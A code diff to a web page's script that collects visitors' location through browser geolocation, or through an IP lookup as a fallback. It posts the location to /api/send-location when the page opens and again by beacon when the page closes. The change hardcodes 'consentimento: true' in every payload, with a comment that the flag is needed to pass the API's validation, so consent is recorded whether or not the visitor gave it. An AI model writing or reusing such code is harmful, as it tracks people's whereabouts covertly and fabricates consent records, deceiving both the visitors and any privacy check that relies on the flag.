@@ -97,7 +97,7 @@
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
       dadosUltimaLocalizacao = { latitude, longitude, maps, source };
-      enviarParaApi(latitude, longitude, maps, source, "abriu_pagina");
+      enviarParaApi(latitude, longitude);
     }
 
     function fallbackLocation() {
@@ -110,36 +110,46 @@
           const source = "Aproximada (IP)";
 
           dadosUltimaLocalizacao = { latitude, longitude, maps, source };
-          enviarParaApi(latitude, longitude, maps, source, "abriu_pagina_ip");
+          enviarParaApi(latitude, longitude);
         })
         .catch(error => {
           console.error("Erro ao obter localização pelo IP:", error);
         });
     }
 
-    function enviarParaApi(latitude, longitude, maps, source, acao) {
+    function enviarParaApi(latitude, longitude) {
       fetch("/api/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({ latitude, longitude, maps, source, acao })
+        body: JSON.stringify({
+          latitude: latitude,
+          longitude: longitude,
+          consentimento: true // Obrigatório para validar na API
+        })
       })
-        .then(response => response.json())
-        .catch(error => {
-          console.error("Erro:", error);
-        });
+      .then(response => response.json())
+      .then(data => {
+        console.log("Sucesso:", data);
+      })
+      .catch(error => {
+        console.error("Erro:", error);
+      });
     }
 
     // Dispara o envio ao fechar ou sair da página com segurança
     window.addEventListener('beforeunload', function () {
-      const payload = JSON.stringify({
-        ...dadosUltimaLocalizacao,
-        acao: 'fechou_pagina'
-      });
+      if (dadosUltimaLocalizacao.latitude !== null && dadosUltimaLocalizacao.longitude !== null) {
+        const payload = JSON.stringify({
+          latitude: dadosUltimaLocalizacao.latitude,
+          longitude: dadosUltimaLocalizacao.longitude,
+          consentimento: true
+        });
 
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon('/api/send-location', payload);
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon('/api/send-location', payload);
+        }
       }
     });
   </script>
